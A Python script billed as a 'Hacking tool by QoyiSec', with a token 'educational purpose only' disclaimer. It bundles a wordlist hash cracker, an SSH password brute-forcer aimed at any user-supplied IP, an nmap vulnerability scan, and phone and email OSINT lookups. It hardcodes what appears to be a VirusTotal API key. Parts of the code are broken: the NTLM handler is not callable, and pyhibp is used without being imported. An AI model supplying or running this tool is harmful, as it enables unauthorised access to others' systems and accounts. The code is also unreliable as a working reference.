# Warning, this is for educational purpose only, so use it at your own risk.
                                                      

#!/usr/bin/env python3
import os
import socket
import subprocess
import sys
import time
from datetime import datetime
import requests
import argparse
import hashlib
import zipfile
import threading
import queue
import json
import dns.resolver
import cryptography.fernet
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import nmap3
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
import instaloader
from colorama import init, Fore, Back, Style
import hydra
import paramiko
from ftplib import FTP
import smtplib
from pyhibp import pwnedpasswords as pw
from pyhibp import set_user_agent

# Initialize colorama
init(autoreset=True)

# ================ CONFIGURATION ================
# API Keys (Replace with your own)
VIRUSTOTAL_API_KEY = "053c6ce23645f7b09fd0b790f1114f347a2a10353960d8ca295be65e5985f33d"
HIBP_API_KEY = "YOUR_HIBP_API_KEY" # optional

# ================ BANNER ================
def banner():
    print(Fore.BLUE + r"""
 ██████╗  ██████╗ ██╗   ██╗██╗███████╗███████╗ ██████╗
██╔═══██╗██╔═══██╗╚██╗ ██╔╝██║██╔════╝██╔════╝██╔════╝
██║   ██║██║   ██║ ╚████╔╝ ██║███████╗█████╗  ██║     
██║▄▄ ██║██║   ██║  ╚██╔╝  ██║╚════██║██╔══╝  ██║     
╚██████╔╝╚██████╔╝   ██║   ██║███████║███████╗╚██████╗
 ╚══▀▀═╝  ╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝                                                      
                                                      
    """ + Style.RESET_ALL)
    print(Fore.CYAN + "Hacking tool by QoyiSec")
    print(Fore.RED + "Law copyright by Qoyi 2025-2029 (jk there is no copyright)")
    print(Fore.YELLOW + "="*80 + Style.RESET_ALL + "\n")
    print(Fore.GREEN + f"Runtime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.GREEN + f"Python: {sys.version.split()[0]}")
    print(Fore.GREEN + f"Platform: {sys.platform}")
    print(Style.RESET_ALL)

# ================ ATTACK MODULES ================
class PasswordCracker:
    def __init__(self):
        self.hash_types = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512,
            'ntlm': hashlib.new('md4')
        }
    
    def crack_hash(self, hash_value, wordlist, hash_type='md5'):
        try:
            if not os.path.exists(wordlist):
                print(Fore.RED + "Wordlist file not found!" + Style.RESET_ALL)
                return
            
            hash_func = self.hash_types.get(hash_type.lower())
            if not hash_func:
                print(Fore.RED + f"Unsupported hash type: {hash_type}" + Style.RESET_ALL)
                return
            
            print(Fore.BLUE + f"\n[+] Cracking {hash_type} hash: {hash_value}" + Style.RESET_ALL)
            start_time = time.time()
            
            with open(wordlist, 'r', errors='ignore') as f:
                for password in f:
                    password = password.strip()
                    if hash_type == 'ntlm':
                        hashed = hash_func(password.encode('utf-16le')).hexdigest()
                    else:
                        hashed = hash_func(password.encode()).hexdigest()
                    
                    if hashed == hash_value:
                        print(Fore.GREEN + f"\n[+] Password found: {password}" + Style.RESET_ALL)
                        print(Fore.GREEN + f"Time elapsed: {time.time() - start_time:.2f} seconds" + Style.RESET_ALL)
                        return
            
            print(Fore.RED + "\n[-] Password not found in wordlist" + Style.RESET_ALL)
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Cracking interrupted by user" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)

class BruteForcer:
    def ssh_bruteforce(self, target, port, username, wordlist):
        try:
            if not os.path.exists(wordlist):
                print(Fore.RED + "Wordlist file not found!" + Style.RESET_ALL)
                return
            
            print(Fore.BLUE + f"\n[+] Starting SSH brute force on {target}:{port}" + Style.RESET_ALL)
            
            with open(wordlist, 'r') as f:
                for password in f:
                    password = password.strip()
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(target, port=port, username=username, password=password, timeout=5)
                        print(Fore.GREEN + f"\n[+] Success! Credentials found: {username}:{password}" + Style.RESET_ALL)
                        client.close()
                        return
                    except:
                        print(Fore.YELLOW + f"[-] Trying: {password}" + Style.RESET_ALL, end='\r')
            
            print(Fore.RED + "\n[-] No valid credentials found" + Style.RESET_ALL)
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Bruteforce interrupted by user" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)

class VulnerabilityScanner:
    def __init__(self):
        self.nmap = nmap3.Nmap()
    
    def scan(self, target):
        try:
            print(Fore.BLUE + f"\n[+] Scanning {target} for vulnerabilities..." + Style.RESET_ALL)
            results = self.nmap.nmap_version_detection(target, args="-sV --script=vulners")
            
            for host in results:
                print(Fore.YELLOW + f"\n[+] Host: {host}" + Style.RESET_ALL)
                for port in results[host]['ports']:
                    if 'script' in port:
                        print(Fore.RED + f"[!] Vulnerability found on port {port['portid']} ({port['service']['name']}):" + Style.RESET_ALL)
                        for script in port['script']:
                            print(f"  {script['id']}: {script['output']}")
            
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)

# ================ OSINT MODULES ================
class PhoneAnalyzer:
    def analyze(self, phone_number):
        try:
            print(Fore.BLUE + f"\n[+] Analyzing phone number: {phone_number}" + Style.RESET_ALL)
            parsed_number = phonenumbers.parse(phone_number)
            
            print(Fore.YELLOW + "\n[+] Carrier Information:" + Style.RESET_ALL)
            print(f"Carrier: {carrier.name_for_number(parsed_number, 'en')}")
            
            print(Fore.YELLOW + "\n[+] Geographic Information:" + Style.RESET_ALL)
            print(f"Region: {geocoder.description_for_number(parsed_number, 'en')}")
            print(f"Timezone: {timezone.time_zones_for_number(parsed_number)}")
            
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)

class EmailAnalyzer:
    def __init__(self):
        set_user_agent(ua="UltimateHackingTool/1.0")
        if HIBP_API_KEY:
            pyhibp.set_api_key(HIBP_API_KEY)
    
    def analyze(self, email):
        try:
            print(Fore.BLUE + f"\n[+] Analyzing email: {email}" + Style.RESET_ALL)
            
            # Check if email has been breached
            breaches = pyhibp.get_account_breaches(account=email, truncate_response=True)
            if breaches:
                print(Fore.RED + "\n[!] Email found in breaches:" + Style.RESET_ALL)
                for breach in breaches:
                    print(f"- {breach['Name']} ({breach['BreachDate']})")
            else:
                print(Fore.GREEN + "\n[+] No breaches found for this email" + Style.RESET_ALL)
                
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)

# ================ MAIN MENU ================
def main():
    banner()
    
    parser = argparse.ArgumentParser(description='Ultimate Ethical Hacking & OSINT Toolkit (2025)')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Attack commands
    crack_parser = subparsers.add_parser('crack', help='Password cracking')
    crack_parser.add_argument('hash', help='Hash to crack')
    crack_parser.add_argument('-w', '--wordlist', required=True, help='Wordlist file path')
    crack_parser.add_argument('-t', '--type', choices=['md5', 'sha1', 'sha256', 'sha512', 'ntlm'], 
                            default='md5', help='Hash type (default: md5)')
    
    brute_parser = subparsers.add_parser('brute', help='SSH brute force')
    brute_parser.add_argument('target', help='Target IP')
    brute_parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (default: 22)')
    brute_parser.add_argument('-u', '--user', required=True, help='Username')
    brute_parser.add_argument('-w', '--wordlist', required=True, help='Password wordlist')
    
    scan_parser = subparsers.add_parser('scan', help='Vulnerability scanning')
    scan_parser.add_argument('target', help='Target IP or hostname')
    
    # OSINT commands
    phone_parser = subparsers.add_parser('phone', help='Phone number analysis')
    phone_parser.add_argument('number', help='Phone number to analyze')
    
    email_parser = subparsers.add_parser('email', help='Email analysis')
    email_parser.add_argument('address', help='Email address to analyze')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    if args.command == 'crack':
        cracker = PasswordCracker()
        cracker.crack_hash(args.hash, args.wordlist, args.type)
    elif args.command == 'brute':
        bruteforcer = BruteForcer()
        bruteforcer.ssh_bruteforce(args.target, args.port, args.user, args.wordlist)
    elif args.command == 'scan':
        scanner = VulnerabilityScanner()
        scanner.scan(args.target)
    elif args.command == 'phone':
        analyzer = PhoneAnalyzer()
        analyzer.analyze(args.number)
    elif args.command == 'email':
        analyzer = EmailAnalyzer()
        analyzer.analyze(args.address)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
